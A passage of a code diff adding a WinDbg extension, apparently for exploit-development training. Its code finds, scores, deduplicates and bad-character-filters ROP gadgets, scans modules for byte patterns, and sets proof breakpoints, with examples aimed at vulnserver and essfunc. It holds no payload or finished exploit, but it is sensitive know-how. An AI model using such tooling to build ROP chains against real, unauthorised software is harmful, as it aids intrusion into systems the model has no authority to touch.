+      var _a, _b, _c, _d;
+      const hostAny = host;
+      const thread = (_a = hostAny.currentThread) != null ? _a : {};
+      const registers = (_c = (_b = thread.Registers) == null ? void 0 : _b.User) != null ? _c : {};
+      const parsed = {};
+      for (const name of ["eip", "esp", "eax", "ebx", "ecx", "edx", "esi", "edi", "ebp"]) {
+        const value = bigintValue((_d = registers[name]) != null ? _d : registers[name.toUpperCase()]);
+        if (value !== void 0)
+          parsed[name] = __bi.asUintN(32, value);
+      }
+      if (parsed.eip === void 0 || parsed.esp === void 0)
+        throw new Error("Unable to read x86 EIP/ESP from the current thread.");
+      return { eip: parsed.eip, esp: parsed.esp, registers: parsed };
+    }
+    readMemory(address, length) {
+      try {
+        return ok(readMemory(address, length));
+      } catch (error2) {
+        return fail("memory-unreadable", error2 instanceof Error ? error2.message : String(error2));
+      }
+    }
+    listBreakpoints() {
+      try {
+        return ok(command("bl").map(parseBreakpoint).filter((entry) => entry !== void 0));
+      } catch (error2) {
+        return fail("breakpoint-list-failed", error2 instanceof Error ? error2.message : String(error2));
+      }
+    }
+    setOneShot(address, marker) {
+      if (!/^osed-proof:v1:[A-Za-z0-9-]+:[A-Za-z0-9-]+:\d+$/.test(marker))
+        return fail("invalid-marker", "Invalid proof breakpoint marker.");
+      try {
+        command(`bp /1 0x${address.toString(16)} ".echo ${marker}"`);
+        const listed = this.listBreakpoints();
+        if (!listed.ok)
+          return listed;
+        const found = listed.value.find((entry) => entry.address === address && entry.marker === marker);
+        return found ? ok({ id: found.id, address, enabled: found.enabled, oneShot: found.oneShot, marker }) : fail("breakpoint-unconfirmed", "WinDbg did not report the newly created proof breakpoint.");
+      } catch (error2) {
+        return fail("breakpoint-set-failed", error2 instanceof Error ? error2.message : String(error2));
+      }
+    }
+    deleteOwned(breakpoint) {
+      const listed = this.listBreakpoints();
+      if (!listed.ok)
+        return { status: "not-found", breakpoint };
+      const observed = listed.value.find((entry) => entry.id === breakpoint.id);
+      if (!observed)
+        return this.readRegisters().eip === breakpoint.address ? { status: "already-fired", breakpoint } : { status: "not-found", breakpoint };
+      if (observed.address !== breakpoint.address || observed.marker !== breakpoint.marker || observed.enabled !== breakpoint.enabled || observed.oneShot !== breakpoint.oneShot) {
+        return { status: "identity-mismatch", breakpoint, observed };
+      }
+      command(`bc ${breakpoint.id}`);
+      return { status: "deleted", breakpoint };
+    }
+    disassemble(address, maxInstructions) {
+      try {
+        const lines = command(`u 0x${address.toString(16)} L${Math.max(1, Math.floor(maxInstructions))}`);
+        const instructions = lines.map((line) => {
+          var _a, _b;
+          return (_b = (_a = /^\s*[0-9a-f`]+\s+[0-9a-f]+\s+(.+)$/i.exec(line)) == null ? void 0 : _a[1]) == null ? void 0 : _b.trim();
+        }).filter((line) => Boolean(line));
+        const bytes = readMemory(address, Math.max(1, Math.min(16, maxInstructions * 4)));
+        return ok({ address, bytes, instructions });
+      } catch (error2) {
+        return fail("disassembly-unavailable", error2 instanceof Error ? error2.message : String(error2));
+      }
+    }
+    getFingerprint(scope) {
+      var _a, _b, _c, _d, _e, _f, _g, _h, _i;
+      try {
+        const hostAny = host;
+        const process = (_a = hostAny.currentProcess) != null ? _a : {};
+        const thread = (_b = hostAny.currentThread) != null ? _b : {};
+        const rawModules = iterable(process.Modules);
+        const allModules = rawModules.map((item) => {
+          var _a2, _b2, _c2, _d2, _e2, _f2;
+          const module = item;
+          const base = (_a2 = bigintValue(module.BaseAddress)) != null ? _a2 : __bi(0);
+          const end = (_b2 = bigintValue(module.EndAddress)) != null ? _b2 : base;
+          return {
+            name: String((_c2 = module.Name) != null ? _c2 : ""),
+            path: String((_e2 = (_d2 = module.Path) != null ? _d2 : module.Name) != null ? _e2 : ""),
+            base,
+            preferredBase: (_f2 = bigintValue(module.PreferredBaseAddress)) != null ? _f2 : base,
+            size: end - base,
+            timestamp: module.TimeDateStamp === void 0 ? void 0 : Number(module.TimeDateStamp),
+            checksum: module.CheckSum === void 0 ? void 0 : Number(module.CheckSum)
+          };
+        });
+        const target = scope.targetPath ? allModules.find((module) => module.path.toLowerCase() === scope.targetPath.toLowerCase()) : allModules[0];
+        const selectedNames = new Set(scope.moduleNames.map((name) => name.toLowerCase()));
+        const modules = allModules.filter((module) => module === target || selectedNames.has(module.name.toLowerCase()));
+        const incompleteReasons = [];
+        const targetSha256 = (target == null ? void 0 : target.path) ? hashFile(target.path) : void 0;
+        if (!target)
+          incompleteReasons.push("target executable identity is unavailable");
+        if (!targetSha256)
+          incompleteReasons.push("target executable could not be read for SHA-256");
+        const gadgets = scope.gadgetAddresses.flatMap((address) => {
+          var _a2;
+          const module = allModules.find((entry) => address >= entry.base && address < entry.base + entry.size);
+          const read = this.readMemory(address, 16);
+          if (!read.ok) {
+            incompleteReasons.push(read.error.message);
+            return [];
+          }
+          return [{ address, module: (_a2 = module == null ? void 0 : module.name) != null ? _a2 : "", rva: module ? address - module.base : address, bytes: read.value, instructions: [] }];
+        });
+        const protections = scope.protectionAddresses.flatMap((address) => {
+          const result3 = this.queryProtection(address);
+          if (!result3.ok) {
+            incompleteReasons.push(result3.error.message);
+            return [];
+          }
+          return [{ address, region: result3.value }];
+        });
+        const is64 = process.Is64Bit === true || String((_c = process.Machine) != null ? _c : "").toLowerCase().includes("64");
+        return ok({
+          processId: (_e = bigintValue((_d = process.Id) != null ? _d : process.ProcessId)) != null ? _e : __bi(0),
+          threadId: (_g = bigintValue((_f = thread.Id) != null ? _f : thread.ThreadId)) != null ? _g : __bi(0),
+          architecture: is64 ? "x64" : "x86",
+          pointerSize: is64 ? 8 : 4,
+          targetPath: (_i = (_h = target == null ? void 0 : target.path) != null ? _h : scope.targetPath) != null ? _i : "",
+          targetSha256,
+          complete: incompleteReasons.length === 0,
+          incompleteReasons,
+          modules,
+          gadgets,
+          protections
+        });
+      } catch (error2) {
+        return fail("fingerprint-failed", error2 instanceof Error ? error2.message : String(error2));
+      }
+    }
+    queryProtection(address) {
+      const evidence = memoryRegion(address);
+      if (evidence.baseAddress === void 0 || evidence.regionSize === void 0 || evidence.raw.protection === void 0) {
+        return fail("protection-unavailable", evidence.warnings.join("; ") || "Memory protection is unavailable.");
+      }
+      const decoded = decodeProtectValue(evidence.raw.protection);
+      return ok(__spreadValues({ base: evidence.baseAddress, size: evidence.regionSize, protect: evidence.raw.protection }, decoded));
+    }
+  };
+
+  // src/rop/corpus_store.ts
+  var CORPUS_EXPORT_SCHEMA_VERSION = "v2";
+  var LEGACY_CORPUS_EXPORT_SCHEMA_VERSION = "v1";
+  function isGadget(value) {
+    if (!value || typeof value !== "object")
+      return false;
+    const gadget = value;
+    return gadget.schemaVersion === "v1" && typeof gadget.canonicalId === "string" && Array.isArray(gadget.instructions) && Array.isArray(gadget.locations) && Array.isArray(gadget.categories) && !!gadget.semanticSummary && Array.isArray(gadget.capabilities);
+  }
+  function reviver(_key, value) {
+    if (value && typeof value === "object" && "$set" in value) {
+      const encoded = value;
+      if (Array.isArray(encoded.$set))
+        return new Set(encoded.$set);
+    }
+    return value;
+  }
+  function isFingerprint(value) {
+    if (!value || typeof value !== "object")
+      return false;
+    const candidate = value;
+    return Array.isArray(candidate.modules) && Array.isArray(candidate.samples) && candidate.modules.every((module) => module && typeof module.name === "string" && typeof module.path === "string" && typeof module.base === "number" && typeof module.size === "number") && candidate.samples.every((sample) => sample && typeof sample.address === "number" && Array.isArray(sample.bytes) && sample.bytes.every((byte) => typeof byte === "number"));
+  }
+  function isCompactGadget(value) {
+    if (!value || typeof value !== "object")
+      return false;
+    const gadget = value;
+    return Array.isArray(gadget.instructions) && gadget.instructions.length > 0 && gadget.instructions.every((instruction) => typeof instruction === "string" && instruction.trim().length > 0) && Array.isArray(gadget.locations) && gadget.locations.every((location) => location && typeof location === "object");
+  }
+  function compactGadget(gadget) {
+    return {
+      // Semantic summaries, classifications, scores, and capabilities are all
+      // deterministic products of these instructions. Persisting them made an
+      // archive much larger without preserving any additional corpus input.
+      instructions: gadget.instructions.map((instruction) => instruction.normalizedText || instruction.originalText),
+      locations: gadget.locations
+    };
+  }
+  function rehydrateGadget(stored) {
+    var _a, _b, _c, _d, _e, _f;
+    const instructions = stored.instructions.map((instruction) => parseInstruction(instruction));
+    const firstLocation = (_a = stored.locations[0]) != null ? _a : {};
+    const sequence = {
+      schemaVersion: SEMANTIC_SCHEMA_VERSION,
+      id: `corpus:${stored.instructions.join(" ; ")}`,
+      source: {
+        kind: "corpus-import",
+        name: (_b = firstLocation.source) != null ? _b : "corpus-import",
+        format: "corpus",
+        version: "v2"
+      },
+      originalText: stored.instructions.join(" ; "),
+      instructions,
+      provenance: {
+        module: firstLocation.module,
+        section: firstLocation.section,
+        virtualAddress: firstLocation.virtualAddress,
+        fileOffset: firstLocation.fileOffset,
+        executable: (_c = firstLocation.executable) != null ? _c : "UNKNOWN",
+        writable: (_d = firstLocation.writable) != null ? _d : "UNKNOWN",
+        aslr: (_e = firstLocation.aslr) != null ? _e : "UNKNOWN",
+        rebaseable: (_f = firstLocation.rebaseable) != null ? _f : "UNKNOWN"
+      }
+    };
+    const semanticSummary = composeSemanticSequence(sequence);
+    const classification = buildRopGadget(semanticSummary);
+    const scoring = scoreSemanticSequence(semanticSummary, classification.categories);
+    return {
+      schemaVersion: ROP_SCHEMA_VERSION,
+      canonicalId: canonicalizeSequenceForPolicy(sequence),
+      instructions,
+      locations: stored.locations,
+      semanticSummary,
+      categories: classification.categories,
+      score: scoring.score,
+      scoreReasons: scoring.scoreReasons,
+      classificationReasons: classification.classificationReasons,
+      capabilities: deriveCapabilities(semanticSummary, classification.categories)
+    };
+  }
+  function exportCorpus(index, fingerprint) {
+    const stored = {
+      schemaVersion: CORPUS_EXPORT_SCHEMA_VERSION,
+      gadgets: index.gadgets.map(compactGadget),
+      fingerprint
+    };
+    return JSON.stringify(stored);
+  }
+  function importCorpus(text) {
+    var _a;
+    let parsed;
+    try {
+      parsed = JSON.parse(text, reviver);
+    } catch (_error) {
+      throw new Error("ROP corpus JSON is invalid.");
+    }
+    if (!parsed || typeof parsed !== "object")
+      throw new Error("ROP corpus JSON must contain an object.");
+    const stored = parsed;
+    if (stored.schemaVersion !== CORPUS_EXPORT_SCHEMA_VERSION && stored.schemaVersion !== LEGACY_CORPUS_EXPORT_SCHEMA_VERSION) {
+      throw new Error(`Unsupported ROP corpus schema '${String((_a = stored.schemaVersion) != null ? _a : "missing")}'.`);
+    }
+    if (!Array.isArray(stored.gadgets) || !isFingerprint(stored.fingerprint)) {
+      throw new Error("ROP corpus JSON is missing gadgets or fingerprint data.");
+    }
+    const gadgets = stored.schemaVersion === CORPUS_EXPORT_SCHEMA_VERSION ? stored.gadgets.every(isCompactGadget) ? stored.gadgets.map(rehydrateGadget) : void 0 : stored.gadgets.every(isGadget) ? stored.gadgets : void 0;
+    if (!gadgets)
+      throw new Error("ROP corpus JSON is missing gadgets or fingerprint data.");
+    return {
+      schemaVersion: CORPUS_EXPORT_SCHEMA_VERSION,
+      index: buildCapabilities(gadgets),
+      fingerprint: stored.fingerprint
+    };
+  }
+  function sameBytes3(left, right) {
+    return left.length === right.length && left.every((byte, index) => byte === right[index]);
+  }
+  function validateCorpus(imported, live) {
+    const reasons = [];
+    for (const expected of imported.fingerprint.modules) {
+      const observed = live.modules.find((module) => module.name === expected.name && module.path === expected.path);
+      if (!observed || observed.base !== expected.base || observed.size !== expected.size) {
+        reasons.push(`module ${expected.name} mapping changed`);
+      }
+    }
+    for (const expected of imported.fingerprint.samples) {
+      const observed = live.samples.find((sample) => sample.address === expected.address);
+      if (!observed || !sameBytes3(expected.bytes, observed.bytes)) {
+        reasons.push(`gadget bytes changed at 0x${expected.address.toString(16)}`);
+      }
+    }
+    return { valid: reasons.length === 0, reasons };
+  }
+
+  // src/semantics/rpplus-provider.ts
+  function defaultSource() {
+    return {
+      kind: "source-adapter",
+      name: "rp++",
+      format: "rp++",
+      version: "v1"
+    };
+  }
+  function defaultProvenance() {
+    return {
+      executable: "UNKNOWN",
+      writable: "UNKNOWN",
+      aslr: "UNKNOWN",
+      rebaseable: "UNKNOWN"
+    };
+  }
+  function parseAddress(line) {
+    const match = line.match(/^\s*0x([0-9a-fA-F]+)\s*:/);
+    if (!match) {
+      return void 0;
+    }
+    const value = Number.parseInt(match[1], 16);
+    return Number.isFinite(value) ? value >>> 0 : void 0;
+  }
+  function splitInstructionParts(line) {
+    const colon = line.indexOf(":");
+    if (colon < 0) {
+      return [];
+    }
+    const body = line.slice(colon + 1).trim();
+    return body.split(";").map((part) => part.trim()).filter((part) => part.length > 0).filter((part) => !/^\(\d+\s+found\)$/i.test(part));
+  }
+  function isBannerLine(line) {
+    const trimmed = line.trim();
+    if (!trimmed) {
+      return true;
+    }
+    if (!/^0x[0-9a-fA-F]+\s*:/.test(trimmed)) {
+      return true;
+    }
+    return false;
+  }
+  function parseRpPlusSequences(text, options = {}) {
+    const lines = text.split(/\r?\n/);
+    const source = __spreadValues(__spreadValues({}, defaultSource()), options.source);
+    const provenance2 = __spreadValues(__spreadValues({}, defaultProvenance()), options.provenance);
+    const sequences = [];
+    for (const line of lines) {
+      if (isBannerLine(line)) {
+        if (options.preserveEmptyLines && line.trim().length === 0) {
+          continue;
+        }
+        if (!/^0x[0-9a-fA-F]+\s*:/.test(line.trim())) {
+          continue;
+        }
+      }
+      const address = parseAddress(line);
+      if (address === void 0) {
+        continue;
+      }
+      const parts = splitInstructionParts(line);
+      if (parts.length === 0) {
+        continue;
+      }
+      const instructions = parts.map((part) => parseInstruction(part));
+      const canonical = canonicalizeTextSequence(parts.join(" ; "));
+      sequences.push({
+        schemaVersion: SEMANTIC_SCHEMA_VERSION,
+        id: `rp++:${address.toString(16).padStart(8, "0")}:${canonical}`,
+        source,
+        originalText: line.trim(),
+        instructions,
+        provenance: __spreadProps(__spreadValues({}, provenance2), {
+          virtualAddress: address
+        })
+      });
+    }
+    return sequences;
+  }
+
+  // src/rop/index.ts
+  function locationFromSequence(sequence) {
+    return {
+      module: sequence.provenance.module,
+      section: sequence.provenance.section,
+      virtualAddress: sequence.provenance.virtualAddress,
+      fileOffset: sequence.provenance.fileOffset,
+      executable: sequence.provenance.executable,
+      writable: sequence.provenance.writable,
+      aslr: sequence.provenance.aslr,
+      rebaseable: sequence.provenance.rebaseable,
+      source: sequence.source.name
+    };
+  }
+  function buildRopGadgetFromSequence(sequence) {
+    const semanticSummary = composeSemanticSequence(sequence);
+    const classification = buildRopGadget(semanticSummary);
+    const scoring = scoreSemanticSequence(semanticSummary, classification.categories);
+    const capabilities = deriveCapabilities(semanticSummary, classification.categories);
+    return {
+      schemaVersion: ROP_SCHEMA_VERSION,
+      canonicalId: canonicalizeSequenceForPolicy(sequence),
+      instructions: sequence.instructions,
+      locations: [locationFromSequence(sequence)],
+      semanticSummary,
+      categories: classification.categories,
+      score: scoring.score,
+      scoreReasons: scoring.scoreReasons,
+      classificationReasons: classification.classificationReasons,
+      capabilities
+    };
+  }
+  function dedupeRopGadgets(gadgets) {
+    const byCanonicalId = /* @__PURE__ */ new Map();
+    for (const gadget of gadgets) {
+      const existing = byCanonicalId.get(gadget.canonicalId);
+      if (!existing) {
+        byCanonicalId.set(gadget.canonicalId, gadget);
+        continue;
+      }
+      existing.locations.push(...gadget.locations);
+    }
+    return [...byCanonicalId.values()];
+  }
+  function buildRopIndexFromSequences(sequences) {
+    const gadgets = dedupeRopGadgets([...sequences].map((sequence) => buildRopGadgetFromSequence(sequence)));
+    const byCanonicalId = /* @__PURE__ */ new Map();
+    for (const gadget of gadgets) {
+      byCanonicalId.set(gadget.canonicalId, gadget);
+    }
+    return { gadgets, byCanonicalId };
+  }
+  function buildRopIndexFromRpPlusText(text, options = {}) {
+    return buildRopIndexFromSequences(parseRpPlusSequences(text, options));
+  }
+  function buildCapabilityIndexFromRpPlusText(text, options = {}) {
+    return buildCapabilityIndex(buildRopIndexFromRpPlusText(text, options));
+  }
+  function buildCapabilityIndex(index) {
+    return buildCapabilities(index.gadgets);
+  }
+  function mergeCapabilityIndexes(indexes) {
+    const gadgets = dedupeRopGadgets([...indexes].flatMap((index) => index.gadgets));
+    return buildCapabilities(gadgets);
+  }
+  function buildCapabilityIndexFromSequences(sequences) {
+    return buildCapabilities(buildRopIndexFromSequences(sequences).gadgets);
+  }
+  function filterCorpusByBadchars(corpus, badchars) {
+    const { kept, removedCount } = filterGadgetsByBadchars(corpus.gadgets, badchars);
+    return { filtered: buildCapabilities(kept), removedCount };
+  }
+  function filterGadgetsByBadchars(gadgets, badchars) {
+    if (badchars.length === 0)
+      return { kept: gadgets, removedCount: 0 };
+    const bad = new Set(badchars.map((b) => b & 255));
+    function addressClean(addr) {
+      for (let i = 0; i < 4; i++) {
+        if (bad.has(addr >>> i * 8 & 255))
+          return false;
+      }
+      return true;
+    }
+    let removedCount = 0;
+    const kept = [];
+    for (const gadget of gadgets) {
+      const cleanLocations = gadget.locations.filter((loc) => loc.virtualAddress === void 0 || addressClean(loc.virtualAddress));
+      if (cleanLocations.length > 0) {
+        kept.push(__spreadProps(__spreadValues({}, gadget), { locations: cleanLocations }));
+      } else {
+        removedCount++;
+      }
+    }
+    return { kept, removedCount };
+  }
+
+  // src/commands/rop.ts
+  function readCandidate(address, size) {
+    try {
+      return readMemory(address, size);
+    } catch (_error) {
+      return void 0;
+    }
+  }
+  function normalizeScan(options) {
+    var _a, _b, _c;
+    return {
+      module: options.module,
+      executableOnly: (_a = options.executableOnly) != null ? _a : true,
+      maxResults: Math.min((_b = options.maxResults) != null ? _b : 50, 200),
+      mode: (_c = options.mode) != null ? _c : "fast"
+    };
+  }
+  function normalizeRopSuggest(options) {
+    var _a;
+    return __spreadProps(__spreadValues({}, normalizeScan(options)), {
+      engine: (_a = options.engine) != null ? _a : "legacy"
+    });
+  }
+  function validationPass(flags) {
+    return flags.decoded && Boolean(flags.mnemonicMatch) && flags.executable;
+  }
+  function collectValidatedPatternHits(pattern, options) {
+    var _a;
+    const pointerSize = getPointerSize();
+    const scan = scanPattern({
+      module: options.module,
+      executableOnly: options.executableOnly,
+      maxResults: options.maxResults,
+      chunkSize: options.mode === "thorough" ? 4096 : 16384
+    }, Uint8Array.from(pattern.bytes));
+    const hits = [];
+    for (const hit of scan.hits) {
+      const candidate = readCandidate(hit, pattern.bytes.length);
+      if (!candidate) {
+        continue;
+      }
+      const validated = validateInstructionCandidateForPointerSize(candidate, true, true, pointerSize);
+      if (!validationPass(validated.flags)) {
+        continue;
+      }
+      hits.push({
+        address: hit,
+        pattern,
+        mnemonic: (_a = validated.mnemonic) != null ? _a : pattern.mnemonic,
+        bytes: pattern.bytes
+      });
+    }
+    return {
+      hits,
+      warnings: scan.warnings.map((warning) => `${warning.region}: ${warning.message}`),
+      stats: scan.stats
+    };
+  }
+  function scanForPattern(name, pattern, options) {
+    const pointerSize = getPointerSize();
+    const { hits, warnings, stats } = collectValidatedPatternHits(pattern, options);
+    const findings = hits.map((hit) => ({
+      address: hit.address,
+      bytes: hit.bytes,
+      mnemonic: hit.mnemonic,
+      pattern: hit.pattern.name
+    }));
+    const rows = hits.map((hit) => ({
+      address: formatAddress(hit.address, pointerSize),
+      mnemonic: hit.mnemonic,
+      bytes: hit.bytes.map((b) => b.toString(16).toUpperCase().padStart(2, "0")).join(" "),
+      py: `0x${hit.address.toString(16).toUpperCase()}`
+    })).sort((a, b) => a.address < b.address ? -1 : 1);
+    if (rows.length > 0) {
+      section(name);
+      table([
+        { key: "address", header: "Address", width: 18 },
+        { key: "mnemonic", header: "Mnemonic", width: 18 },
+        { key: "bytes", header: "Bytes", width: 16 },
+        { key: "py", header: "Python", width: 14 }
+      ], rows);
+    }
+    return {
+      command: name,
+      args: options,
+      success: true,
+      findings,
+      warnings,
+      errors: [],
+      stats
+    };
+  }
+  function buildSequenceFromHit(hit) {
+    const instructions = hit.pattern.mnemonic.split(" ; ").map((part) => parseInstruction(part));
+    const moduleInfo = findModuleByAddress(hit.address);
+    const provenance2 = {
+      module: moduleInfo == null ? void 0 : moduleInfo.name,
+      section: moduleInfo ? ".text" : void 0,
+      virtualAddress: Number(__bi.and(hit.address, __bi(4294967295))),
+      fileOffset: void 0,
+      executable: "EXACT",
+      writable: "UNKNOWN",
+      aslr: "UNKNOWN",
+      rebaseable: "UNKNOWN"
+    };
+    const source = {
+      kind: "rop-suggest",
+      name: "semantic-backend",
+      format: "synthetic",
+      version: "v1"
+    };
+    return {
+      schemaVersion: SEMANTIC_SCHEMA_VERSION,
+      id: `rop-suggest:${hit.pattern.name}:${hit.address.toString(16)}:${instructions.map((instruction) => instruction.normalizedText).join(" | ")}`,
+      source,
+      originalText: hit.pattern.mnemonic,
+      instructions,
+      provenance: provenance2
+    };
+  }
+  function runSemanticRopSuggest(options) {
+    var _a, _b, _c, _d, _e, _f, _g, _h, _i, _j;
+    const pointerSize = getPointerSize();
+    const combinedWarnings = [];
+    const allHits = [];
+    let combinedStats = { sectionsScanned: 0, chunksRead: 0, chunksSkipped: 0, results: 0, stoppedEarly: 0 };
+    for (const pattern of knownPatternsForPointerSize(pointerSize)) {
+      const result3 = collectValidatedPatternHits(pattern, options);
+      allHits.push(...result3.hits);
+      combinedWarnings.push(...result3.warnings);
+      combinedStats = {
+        sectionsScanned: combinedStats.sectionsScanned + ((_b = (_a = result3.stats) == null ? void 0 : _a.sectionsScanned) != null ? _b : 0),
+        chunksRead: combinedStats.chunksRead + ((_d = (_c = result3.stats) == null ? void 0 : _c.chunksRead) != null ? _d : 0),
+        chunksSkipped: combinedStats.chunksSkipped + ((_f = (_e = result3.stats) == null ? void 0 : _e.chunksSkipped) != null ? _f : 0),
+        results: combinedStats.results + ((_h = (_g = result3.stats) == null ? void 0 : _g.results) != null ? _h : 0),
+        stoppedEarly: combinedStats.stoppedEarly + ((_j = (_i = result3.stats) == null ? void 0 : _i.stoppedEarly) != null ? _j : 0)
+      };
+    }
+    const index = buildRopIndexFromSequences(allHits.map((hit) => buildSequenceFromHit(hit)));
+    const gadgets = [...index.gadgets].sort((left, right) => {
+      var _a2, _b2, _c2, _d2;
+      if (left.score !== right.score) {
+        return right.score - left.score;
+      }
+      const leftAddress = (_b2 = (_a2 = left.locations[0]) == null ? void 0 : _a2.virtualAddress) != null ? _b2 : 0;
+      const rightAddress = (_d2 = (_c2 = right.locations[0]) == null ? void 0 : _c2.virtualAddress) != null ? _d2 : 0;
+      return leftAddress - rightAddress;
+    });
+    const rows = gadgets.map((gadget, index2) => {
+      var _a2, _b2;
+      const firstLocation = gadget.locations[0];
+      const address = __bi((_a2 = firstLocation == null ? void 0 : firstLocation.virtualAddress) != null ? _a2 : 0);
+      return {
+        rank: `${index2 + 1}`,
+        address: formatAddress(address, pointerSize),
+        mnemonic: gadget.instructions.map((instruction) => instruction.normalizedText || instruction.originalText).join(" ; "),
+        category: (_b2 = gadget.categories[0]) != null ? _b2 : "UNKNOWN",
+        score: `${gadget.score}`,
+        python: `0x${address.toString(16).toUpperCase()}`,
+        locations: `${gadget.locations.length}`
+      };
+    });
+    section("ROP Suggestions (semantic)");
+    if (rows.length === 0) {
+      print("No semantic gadget suggestions found.");
+    } else {
+      table([
+        { key: "rank", header: "Rank", width: 6 },
+        { key: "address", header: "Address", width: 18 },
+        { key: "mnemonic", header: "Mnemonic", width: 28 },
+        { key: "category", header: "Category", width: 18 },
+        { key: "score", header: "Score", width: 6 },
+        { key: "locations", header: "Locs", width: 6 },
+        { key: "python", header: "Python", width: 14 }
+      ], rows);
+    }
+    info("Semantic backend selected; duplicate gadgets are merged by canonical IR.");
+    whyItMatters("Semantic gadget suggestions improve ranking, deduplication, and explainability.");
+    return {
+      command: "rop_suggest",
+      args: options,
+      success: true,
+      findings: gadgets,
+      warnings: combinedWarnings,
+      errors: [],
+      stats: __spreadProps(__spreadValues({}, combinedStats), { canonicalResults: gadgets.length })
+    };
+  }
+  function runLegacyRopSuggest(options, initialWarnings = []) {
+    var _a, _b, _c, _d, _e, _f, _g, _h, _i, _j;
+    const combinedFindings = [];
+    const combinedWarnings = [...initialWarnings];
+    let combinedStats = { sectionsScanned: 0, chunksRead: 0, chunksSkipped: 0, results: 0, stoppedEarly: 0 };
+    const pointerSize = getPointerSize();
+    for (const pattern of knownPatternsForPointerSize(pointerSize)) {
+      const result3 = scanForPattern(`ROP Suggest: ${pattern.name}`, pattern, options);
+      combinedFindings.push(...result3.findings.map((finding) => __spreadProps(__spreadValues({}, finding), { pattern: pattern.name })));
+      combinedWarnings.push(...result3.warnings);
+      combinedStats = {
+        sectionsScanned: combinedStats.sectionsScanned + ((_b = (_a = result3.stats) == null ? void 0 : _a.sectionsScanned) != null ? _b : 0),
+        chunksRead: combinedStats.chunksRead + ((_d = (_c = result3.stats) == null ? void 0 : _c.chunksRead) != null ? _d : 0),
+        chunksSkipped: combinedStats.chunksSkipped + ((_f = (_e = result3.stats) == null ? void 0 : _e.chunksSkipped) != null ? _f : 0),
+        results: combinedStats.results + ((_h = (_g = result3.stats) == null ? void 0 : _g.results) != null ? _h : 0),
+        stoppedEarly: combinedStats.stoppedEarly + ((_j = (_i = result3.stats) == null ? void 0 : _i.stoppedEarly) != null ? _j : 0)
+      };
+    }
+    whyItMatters("Validated gadget suggestions reduce false positives during ROP chain construction.");
+    return {
+      command: "rop_suggest",
+      args: options,
+      success: true,
+      findings: combinedFindings,
+      warnings: combinedWarnings,
+      errors: [],
+      stats: combinedStats
+    };
+  }
+  function createRopCommands() {
+    const rop = {
+      name: "rop",
+      description: "ROP helper entrypoint and module triage.",
+      usage: "dx @$osed().rop.find(module?, maxResults?, executableOnly?, mode?)",
+      examples: ["dx @$osed().rop.find()", 'dx @$osed().rop.find("essfunc")'],
+      schema: {
+        module: { type: "string" },
+        executableOnly: { type: "boolean", default: true },
+        maxResults: { type: "number", min: 1, max: 200, default: 50 },
+        mode: { type: "string", enum: ["fast", "thorough"], default: "fast" }
+      },
+      execute(options) {
+        const modules = listModulesWithMitigations(options.module);
+        section("ROP Module Scope");
+        table([
+          { key: "name", header: "Module", width: 18 },
+          { key: "base", header: "Base", width: 18 },
+          { key: "size", header: "Size", width: 10 }
+        ], modules.map((module) => ({
+          name: module.name,
+          base: formatAddress(module.base, 8),
+          size: `0x${module.size.toString(16).toUpperCase()}`
+        })));
+        info("Use find_bytes or rop_suggest for bounded gadget discovery.");
+        whyItMatters("ROP planning starts with selecting stable module memory ranges.");
+        return {
+          command: "rop",
+          args: options,
+          success: true,
+          findings: modules,
+          warnings: [],
+          errors: []
+        };
+      }
+    };
+    const findBytes = {
+      name: "find_bytes",
+      description: "Find byte sequence hits in PE sections of a loaded module.",
+      usage: "dx @$osed().find_bytes(module, bytes, maxResults?, executableOnly?, mode?)",
+      examples: [
+        'dx @$osed().find_bytes("vulnserver", "FF E4")',
+        'dx @$osed().find_bytes("essfunc", "58 C3", 25)'
+      ],
+      schema: {
+        module: { type: "string", required: true },
+        bytes: { type: "array", elementType: "number", required: true },
+        executableOnly: { type: "boolean", default: true },
+        maxResults: { type: "number", min: 1, max: 200, default: 50 },
+        mode: { type: "string", enum: ["fast", "thorough"], default: "fast" }
+      },
+      execute(options) {
+        const bytes = options.bytes;
+        if (bytes.length === 0 || bytes.some((value) => !Number.isInteger(value) || value < 0 || value > 255)) {
+          throw new Error("bytes must contain 0x00..0xFF integers.");
+        }
+        const scanOpts = normalizeScan(options);
+        const scan = scanPattern({
+          module: options.module,
+          executableOnly: scanOpts.executableOnly,
+          maxResults: scanOpts.maxResults,
+          chunkSize: scanOpts.mode === "thorough" ? 4096 : 16384
+        }, Uint8Array.from(bytes));
+        const pointerSize = getPointerSize();
+        const rows = scan.hits.map((hit) => ({
+          address: formatAddress(hit, pointerSize),
+          python: `0x${hit.toString(16).toUpperCase()}`
+        }));
+        section("Find Bytes");
+        table([
+          { key: "address", header: "Address", width: 18 },
+          { key: "python", header: "Python", width: 18 }
+        ], rows);
+        for (const warning of scan.warnings) {
+          warn(`${warning.region}: ${warning.message}`);
+        }
+        if (scan.stats.sectionsScanned > 0 && scan.hits.length === 0) {
+          info(`Scanned ${scan.stats.sectionsScanned} section(s) in ${scan.stats.chunksRead} readable chunk(s); no byte matches found.`);
+          info(scanOpts.executableOnly ? "Scope: executable PE sections in the matched module only; this does not search stack, heap, or other live process buffers." : "Scope: PE sections in the matched module only; this does not search stack, heap, or other live process buffers.");
+        }
+        whyItMatters("Targeted byte matches accelerate practical gadget and pivot discovery.");
+        return {
+          command: "find_bytes",
+          args: options,
+          success: true,
+          findings: scan.hits,
+          warnings: scan.warnings.map((warning) => `${warning.region}: ${warning.message}`),
+          errors: [],
+          stats: scan.stats
+        };
+      }
+    };
+    const ropSuggest = {
+      name: "rop_suggest",
+      description: "Suggest common exploit-friendly gadget patterns.",
+      usage: "dx @$osed().rop_suggest(module?, maxResults?, executableOnly?, mode?, engine?)",
+      examples: [
+        'dx @$osed().rop_suggest("essfunc")',
+        'dx @$osed().rop_suggest("essfunc", 50, true, "fast", "semantic")',
+        'dx @$osed().rop_suggest("", 50, true, "thorough", "legacy")'
+      ],
+      schema: {
+        module: { type: "string" },
+        executableOnly: { type: "boolean", default: true },
+        maxResults: { type: "number", min: 1, max: 200, default: 50 },
+        mode: { type: "string", enum: ["fast", "thorough"], default: "fast" },
+        engine: { type: "string", enum: ["legacy", "semantic"], default: "legacy" }
+      },
+      execute(options) {
+        const scanOptions = normalizeRopSuggest(options);
+        if (scanOptions.engine === "semantic") {
+          if (getPointerSize() === 8) {
+            return runLegacyRopSuggest(scanOptions, ["Semantic ROP backend is currently x86-only; used x64 byte-pattern scanner instead."]);
+          }
+          return runSemanticRopSuggest(scanOptions);
+        }
+        return runLegacyRopSuggest(scanOptions);
+      }
+    };
+    const retnGadgets = {
+      name: "retn",
